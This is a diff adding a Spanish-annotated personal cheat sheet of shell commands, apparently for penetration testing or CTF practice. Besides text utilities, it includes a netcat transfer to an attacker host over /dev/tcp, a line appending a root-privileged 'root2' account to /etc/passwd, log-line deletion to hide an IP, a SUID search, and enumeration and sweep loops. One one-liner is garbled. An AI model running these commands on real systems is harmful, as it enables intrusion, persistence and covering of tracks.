@@ -1,0 +1,79 @@
+# netcat
+A> nc -lnvp 444 < chisel
+V> cat > chisel < nc /dev/tcp/ip_atacante/444
+
+# abre un puerto y queda a la espera de conexiones
+rlwrap nc -lnvp PUERTO 
+
+# cp
+cp FILE.iso REN-FILE.iso && watch -n 2 du -sh $! 
+
+# cat
+cat file | tr '[A-Z]' '[a-z]' **convierte Mayusculas por Minusculas**
+cat file | grep ::: | awk -F: '{print $1":"$4}'
+cat file | xclip -sel clip **copia el contenido del archivo en el portapapeles**
+cat nmap.grep | grep -oP '\d{1,5}/tcp.*'
+
+# xclip
+xclip -out -sel clip > file
+xclip -sel clip
+
+# find
+find / -perm -4000 -type f 2>/dev/null
+find . -type d -exec touch {}/FILE \;
+find . -type f -printf "%T+ %p\n" | sort **ordena archivos con timestamp**
+find / -group GRUPO -type f 2>/dev/null
+find / -user USUARIO -type f 2>/dev/null
+
+# mount
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+
+# manipulacion de texto
+tr '\n' ',' < tplinkList.txt
+paste -sd "," FILE **agrega una coma entre palabras**
+head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' **generador de passwords**
+sed -i '/192\.168\.0\.1/d' /var/log/messages.log **elimina todas las lineas que contienen la ip**
+awk '{print "https://"$1}'
+awk '{print $1 ":" $2}'
+awk '{print $1}' FS=':' **FS=delimitador**
+echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd **crear un usuario 'root2' con el PASSWORD creado**
+echo !:2-3 **rango de argumentos**
+echo !? **estado de salida del último comando**
+echo !$ **ultimo argumento**
+echo !^ **primer argumento**
+echo !* **todos los argumentos**
+grep -oP '\[.*?\]' **quita los corchetes**
+grep -a '[0-9][0-9]:[0-9][0-9]:[0-9][0-9]' /var/log/apache2/access.log **formato: HH:MM:SS**
+
+# One-liners
+for seq in $(seq 5); do curl -s -i http://10.10.74.120/post?id=$seq | grep 'Post not found' &>/dev/null && echo "post $seq no existe" || echo "post>for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done **bucle para enum directorios**
+for i in {1..20}; do curl http://ip/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done **enum de usuarios**
+for i in {1..10}; do timeout 1 bash -c "ping 192.168.0.$i"; done | grep '64' | awk '{print $4}' | tr -d ':' **ping sweep**
+for x in port port port; do nmap -Pn --max-retries 0 -p $x ip; done **port knocker**
+for num in {1..10}; do sudo arping -c 1 192.168.0.$num | grep '60' | awk '{print $4 "\t" $5}' | sed 's/(/ /;s/)/ /;s/.$//'; done **mac sweep**
+[ -d "${DIR}" ] || mkdir -p "${DIR}" **crear una carpeta sino existe**
+
+# manipulación de archivos/carpetas
+touch {/folder1/,./}file.{exe,dll,txt} **crea multiples archivos**
+curl -# --upload-file -F file=@FILE URL
+dd if=FILE bs=1 skip=8 of=FILE.out **saca los primeros 8 bytes y deja el resto**
+dd if=FILE bs=1 count=8 of=FILE.out **solo deja los primeros 8 bytes**
+smbget -R smb://ip/carpeta -U USER
+
+# arp discovery
+arping -c 1 -I enp5s0 ip/mask
+arp-scan -I enp5s0 ip/mask
+masscan --arp ip/mask > file
+sudo nmap -RP ip
+
+# varios
+ping -c ip -R **muestra ruta del ping hasta el destino**
+
+kill -9 $(jobs -p) **elimina los trabajos**
+kill % **borra todos los trabajos**
+
+xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103 **conexion remota via RDP**
+
+read -n 5 -s -p "No podes poner mas de 5 caracteres" **#n=caracteres, s=silent(oculta el texto), p=prompt**
+read -t 10 **10 segundos para ingresar texto**
+
